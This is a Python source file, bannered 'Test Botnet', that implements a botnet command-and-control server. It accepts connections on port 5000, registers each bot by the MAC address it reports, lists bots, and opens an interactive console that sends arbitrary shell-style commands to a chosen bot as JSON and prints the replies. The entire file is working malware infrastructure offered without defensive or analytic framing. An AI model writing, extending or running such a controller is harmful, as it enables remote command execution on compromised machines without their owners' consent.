import socket
import threading
import json

conn_list={}
def server():
    global conn_list
    HOST = ''                 # all available interfaces
    PORT = 5000            # port
    global count
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    while True:
        conn, addr = s.accept()
        mac=""
        if conn:

            mac=conn.recv(4098).decode('utf-8')
            if mac:
                if mac in conn_list:
                    print("\n[*] Bot Online:{}".format(mac))
                else:
                    print("\n[+] Bot Added:{}".format(mac))
                    conn_list[mac]=conn


def client():
    global conn_list
    count = 0
    if conn_list:
        for key in conn_list:
            count+=1
            print("{}) {}".format(count,key))

    else:
        print("\nList is empty")



def trigger():
    global conn_list
    interaction=int(input("bot id number (1-99+):-"))
    if interaction:
        if conn_list:
            if interaction<=len(conn_list):
                #print(conn_list)
                console(conn_list[list(conn_list.keys())[interaction-1]],list(conn_list.keys())[interaction-1],list(conn_list.keys())[interaction-1])
        else:
            print("\nNo connections")

def console(conn,bot,socket_target):
    print("\n====Target::({})====".format(bot))

    while True:
        commands=input("cmd>")
        a={bot:commands}
        if commands=='exit':
            return 0
        else:
            commands=json.dumps(a)
            commands = bytes(commands, 'utf-8')
            conn.sendall(commands)
            out=conn.recv(64000).decode('utf-8')
            if out=="Dead":
                print("====Host:{} went offline===".format(bot))
                del conn_list[socket_target]
                return 0
            else:
                print(out)



def banner():
    print("Test Botnet")

def main():
    banner()
    threading.Thread(target=server).start()
    print("[+] Server Started")
    print("Type help or ? for options")
    while True:

        choice=input(">")
        if choice=='bots' or choice =='b':
            p=threading.Thread(target=client)
            p.start()
            p.join()
        elif choice =='interact' or choice =='i':
            p=threading.Thread(target=trigger)
            p.start()
            p.join()
        elif choice =='help' or choice =='?':
            print("\n==========\nbots or b :To check for available bots online\ninteract or i :To interact with a target\n==========")
        else:
            pass


main()